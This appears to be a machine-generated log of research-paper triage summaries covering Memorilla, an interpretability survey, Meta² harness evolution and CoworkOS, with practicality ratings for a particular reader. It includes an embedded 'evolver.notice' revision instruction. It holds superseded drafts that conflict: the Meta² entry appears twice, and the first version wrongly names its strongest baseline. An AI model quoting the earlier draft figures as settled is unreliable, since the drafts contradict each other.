- key numbers: FactKG Acc 84.33 for Memorilla vs 80.43 full context and 80.38 MemoRAG (Table 11). PubMedQA Acc 59.00 for Memorilla vs 69.00 for LLMLingua-2 and 67.00 for four others (Table 11). Memorilla's 16 tokens are compared to full-context document tokens per Table 10. Run counts and spread for the headline numbers: not stated; the paper gives a single seed (23) for training (Table 4/5) but no error bars or repeated evaluation runs for the benchmark scores.
- code/weights: The paper says "We are releasing the code, the training and evaluation data with precomputed embeddings, and the PersonalizationV4 data on our project website https://memory.stanford.edu/". Whether that release has been posted, and whether it includes trained checkpoints, is not stated in the text.
- practical: LOW
- why: The mechanism needs a supervised training run over about 3.3M examples across 4 H100s (Table 4 and Section 2.6), and the decoder is Qwen3-8B, which is larger than the models the reader runs locally. Headline gains are single-run deltas of about 4 points on FactKG and mixed results elsewhere (it loses on PubMedQA and NarrativeQA ROUGE-L to MemoRAG), so the margins need the spread the paper does not report before they count as evidence. The useful design idea (query-conditioned slots over a frozen store, with only the reader trained) is transferable but would need training infrastructure he does not have.

### 1. Memorilla: Latent Semantic Memory for LLMs (2610.21375)
- what: Trains a small cross-attention module that reads precomputed document embeddings and emits 16 query-conditioned soft tokens into a frozen Qwen3-8B decoder, leaving the decoder unchanged.
- read: full (text supplied in the message; the paper names https://memory.stanford.edu/ as its project site, not fetched)
- key numbers: FactKG Acc, Memorilla 84.33 vs full context 80.43 (margin 3.90 pp) and MemoRAG 80.38 (3.95 pp) (Table 11). PubMedQA Acc, Memorilla 59.00 vs LLMLingua-2 69.00 and four baselines at 67.00 (Table 11). Run count and spread for these comparisons: not stated. The paper gives training seed 23 (Table 4) and says "All supervised evaluations use greedy decoding and a fixed random seed" (Reproducibility statement), but gives no evaluation seed count, error bars, or repeated runs.
- code/weights: The paper says "We are releasing the code, the training and evaluation data with precomputed embeddings, and the PersonalizationV4 data on our project website https://memory.stanford.edu/". Whether that release is posted, and whether it includes trained checkpoints, is not stated in the text.
- practical: LOW
- why: Adopting the method means a supervised training run. The paper's corpora are 1,979,809 Stage 1 and 1,343,993 Stage 2 queries (Table 1), about 3.3M in total; the Stage 3 corpus size is not stated. Each stage uses 4 GPUs (Table 4). The margins on FactKG are 3.90 to 3.95 pp, and with no stated run count or spread they cannot be separated from noise. On PV4, MemoRAG leads 67.88 to 66.65. The transferable idea is query-conditioned slots reading a frozen embedding store, but he would need that training run before testing it.

- what: A survey of mechanistic interpretability for AI safety that covers SAEs, transcoders/CLTs, circuits, probing and concept-based methods, and interpretability-by-design, and sets out a critique of MI's role in safety. The supplied text ends mid-sentence in §6.10.4, so the later framework, orientations, safety applications and open problems are not assessed.

The notebook and website links in the abstract (https://github.com/TSGLAB/Interpretability_Survey_Safety, https://tsglab.github.io/mi_survey/) were not opened.
- key numbers: Not a results paper, and the paper states no experiments of its own in the text read. Figures in the text read, all attributed to cited works: CLT top-1 prediction match "only about 50% of prompts from the Pile" on an 18-layer model (Ameisen et al., 2025, cited); CLT suite for Gemma-2-9B "approximately 3,844 H100 GPU-hours at 50% FLOPs efficiency" (Ameisen et al., 2025, cited); Top-k values "k=32" to "150" (Gao et al., 2025; Karvonen et al., 2025, cited); dead features "up to 10–50% of the dictionary in a poorly tuned SAE" (Bricken et al., 2023, cited). Sample size, run count and seed count for the paper's own claims: not stated. Seed-to-seed feature stability: "Often, fewer than 50% of features remain the same across seeds" (§6.5.4, no specific source given in the sentence).
- code/weights: The abstract states the notebooks "reproduce key findings from methods surveyed here" and gives the repository and website links above. The text read does not state which models the notebooks use or whether they run on consumer hardware: not stated. SAE weights for Gemma Scope, Llama Scope and Gemma Scope 2 are cited to other works, not released by this paper.
- practical: LOW
- why: The parts read are a useful checklist, not a method he can adopt as-is. The SAE failure-mode checks (§6.5.6: report dead-feature rate, duplication and seed stability; test necessity, sufficiency and specificity) cost little to add to any SAE work. The probe-versus-SAE note (§6.9.4, citing Wu et al., 2025b, "probing has outperformed SAEs in concept detection") bears on his routing and triage work only if he trains SAEs, which he does not, so it does not change a design decision in his stack. The notebooks might be a quick test, but the abstract only says they "reproduce key findings", and their models and hardware are not stated, so they do not raise the rating. The CLT and weight-sparse methods need training budgets he does not have, which holds the rating at LOW under E-05.

### 1. Meta² : Precomputing Reusable Knowledge for Online Harness Evolution in Long-Horizon Agents (2611.05139)
- what: Learns an offline textual "Meta-Skill" from A/B/C rollout contrasts (no evolver / evolver with Meta-Skill / evolver with privileged verifier), then freezes it and uses it to guide KEEP-or-EVOLVE checkpoint edits within a single run, resetting the harness to h(0) for each new task.
- read: full (text supplied in the message; no URL given in the supplied text beyond the project home page `https://meta-square.github.io/`). Read coverage runs through the end of the appendix, including Appendix I; no truncation observed.
- key numbers: Terminal-Bench 2.1 (GPT-5.6-Terra, mean@5): Meta² 81.00 vs NexAU seed 66.33 and best baseline Meta-Harness 73.33 (Table 1). DeepSWE 1.1 (mean@3): Meta² 44.44 vs seed 34.67, Meta-Harness 37.33. Table 5 gives Meta² sd 0.91 (TB) and 0.77 (DeepSWE) across 5 and 3 repetitions. Table 4: 60 TB test tasks, 75 DeepSWE test tasks, 29 and 38 training tasks. Ablation (Figure 4 text): evolver without knowledge 74.67/36.44; self-distilled Meta-Skill 77.00/35.56; contrastive 81.00/44.44. Checkpoint interval L=5 is the chosen setting; the paper states the L=3 and L=1 scores (80.33%, 79.00%) with no spread given.
- code/weights: not stated. The only link is the project home page (`https://meta-square.github.io/`); no repository or Meta-Skill release is named in the text.
- practical: LOW
- why: The mechanism needs a multi-condition offline rollout pipeline (A/B/C runs per training task, LLM reflect/aggregate/update) and a checkpoint harness with a custom evolver, which is an out-of-stack system for this reader. The Meta-Skill itself is a text artifact he could imitate, but the headline gains are single-backbone point estimates on 60 and 75 tasks with no code released, and the reported spread is for repetitions, not an independent comparison of the Meta-Skill against a matched-budget baseline. The one transferable idea (freeze a reusable decision-knowledge file, keep edits run-local) is a principle, not a component he can test within weeks.

### 1. Meta²: Precomputing Reusable Knowledge for Online Harness Evolution in Long-Horizon Agents (2611.05139)
- what: Learns an offline textual Meta-Skill from A/B/C rollout contrasts (no evolver / evolver guided by the current Meta-Skill / evolver with privileged verifier information), freezes it, and uses it to guide KEEP-or-EVOLVE checkpoint edits within a single run, resetting the harness to h(0) for each new run.
- read: full (text supplied in the message). Read coverage runs through Appendix I.2 and the appendix outline tail; no truncation before that point. The only project link in the text is `https://meta-square.github.io/`.
- key numbers:
  - Terminal-Bench 2.1, GPT-5.6-Terra, mean@5 (Table 1): Meta² 81.00 (+14.67); seed NexAU 66.33; Meta-Harness 73.33 (+7.00). Highest baseline row is TF-GRPO 74.67 (+8.34). Table 5 spreads: Meta² 81.00±0.91, TF-GRPO 74.67±4.62, seed 66.33±2.17, over 5 repetitions of 60 tasks. Margin over TF-GRPO is 6.33 pp.
  - DeepSWE 1.1, mean@3 (Table 1): Meta² 44.44 (+9.77); seed 34.67; Meta-Harness 37.33 (+2.66). Highest baseline row is Pi agent 39.11. Table 5 spreads: Meta² 44.44±0.77, Pi agent 39.11±6.71, Meta-Harness 37.33±2.67, over 3 repetitions of 75 tasks. Margin over Pi agent is 5.33 pp, below Pi agent's own sd of 6.71 with only 3 repetitions.
  - Second backbone, Terminal-Bench 2.1, DeepSeek-V4-Flash-0731, high effort, mean@5 (Table 2): Meta² 77.67±3.84; seed 70.00±2.64; highest baseline row Continual Harness 74.67±4.62. Margin 3.00 pp, inside both spreads. The paper says it built a separate Meta-Skill per backbone. DeepSWE was not run on this backbone.
  - Full cost, Terminal-Bench (Table 1): Meta² $174.91 (offline $110.19, online $64.72); AHE $248.35 (offline $209.44, online $38.91); Meta-Harness $198.85 (online $38.34). Meta²'s online cost is higher than AHE's and Meta-Harness's; its advantage is the lower full cost against AHE and Meta-Harness. DeepSWE full cost: Meta² $367.86, AHE $862.89, Meta-Harness $870.75. Table 1 caption: costs are "aggregate US dollars over each evaluation." Section 4.1 says cost is computed "from the per-call charges in its response headers"; whether hidden reasoning tokens are included is not stated.
  - Ablation, Terminal-Bench/DeepSWE (Figure 4 text): task agent alone 66.33/34.67; online evolver without knowledge 74.67/36.44; self-distilled Meta-Skill 77.00/35.56; contrastive Meta-Skill 81.00/44.44. Reset-vs-carry: 81.00→78.33 (TB) and 44.44→39.11 (DeepSWE). Spread and run count for the ablation rows: not stated.
  - Checkpoint interval, Terminal-Bench (RQ3 text): L=5 81.00 at $64.72; L=3 80.33 at $74.22; L=1 79.00 at $83.41; L=11 at $59.10 with no score given. Spread: not stated.
- code/weights: not stated. The only link is the project home page `https://meta-square.github.io/`. No repository or Meta-Skill release is named in the text.
- practical: LOW
- why: The method needs an offline A/B/C rollout pipeline with LLM reflect/aggregate/update stages, a custom checkpoint evolver, and E2B sandboxes, none of which he runs, so the components he could copy are a prompt pattern and a text file. The design decision worth taking is run-local edits with a fixed knowledge file, which the reset ablation supports by 2.67 pp (TB) and 5.33 pp (DeepSWE), but no spread is stated for those ablation rows. The headline margins are 6.33 pp over the top Terminal-Bench baseline and 5.33 pp over the top DeepSWE baseline, with a 3-repetition DeepSWE baseline sd of 6.71 and no code released.

evolver.notice: Correct the compute claim in your 'why'. Appendix A.3's Table 2 gives optimizer steps per round (R0 66, R1 69, R2 10, R3 24, R4 22, R5 20). What the paper does not state is a dollar or token cost for the CoworkOS runs, a dollar or token cost for the RSI training run, or a total GPU-hours figure. Restate the cost claim with that scope. Keep the LOW rating only if the reasons still hold after the correction: the GLM-5.3 backbone is out of the reader's stack, and no run count or spread is given for the Table 1 margins (DSH is ahead on Tool Use by 0.09, and CoworkOS leads Productivity by 1.41 and ML Coding by 0.12).

### 1. CoworkOS: Scaling Agent Coworkers for Real-world Automation (2611.03178)
- what: Describes CoworkOS, a three-layer agent harness (Main, Coordinator Runtime, Subagents) with async delegation, a shared application-resource protocol with revision checks, persistent workspaces and Jobs, and an RSI post-training case study.
- read: full (text supplied; read through Appendix A.3 and the training-lineage table, which is the last section in the supplied text)
- key numbers: Table 1, CoworkOS vs DeepSeek Harness (DSH): Tool Use 55.22 vs 55.31 (DSH +0.09); Productivity 57.54 vs 56.13 (+1.41); ML Coding 56.26 vs 56.14 (+0.12). OpenHands Tool Use average is 51.33. RSI average over eight benchmarks goes 33.19 (R0) to 42.95 (R5), +9.76 (Table 2). Run or seed count and spread for Table 1: not stated. Optimizer steps per RSI round (A.3 training-lineage table): R0 66, R1 69, R2 10, R3 24, R4 22, R5 20.
- code/weights: repo https://github.com/RUC-NLPIR/CoworkOS and project page https://coworkos-ai.github.io/ are stated. Model weights for the post-trained Qwen3.6-35B-A3B: not stated. Whether the repo contains the full harness used in the paper: not verified.
- practical: LOW
- why: The main backbone is GLM-5.3 ("GLM-5.3 primarily serves as the controller and data teacher"), which the reader is unlikely to run, and the Table 1 margins over DSH (0.09 to 1.41 points) have no stated run count or spread, so they cannot be separated from noise. Compute is partly given: MLE-Bench-Lite uses "a five-hour agent budget, 4 CPUs, 32 GiB of memory, and one H200 GPU per task", and optimizer steps are listed per RSI round, but no dollar or token cost is stated for the CoworkOS runs or the RSI training run, and no total GPU-hours is stated. The Inbox acknowledgement pattern and the base-revision check in Eq. 7 are the transferable parts Muninn could copy, but no ablation isolates them, so LOW stands.
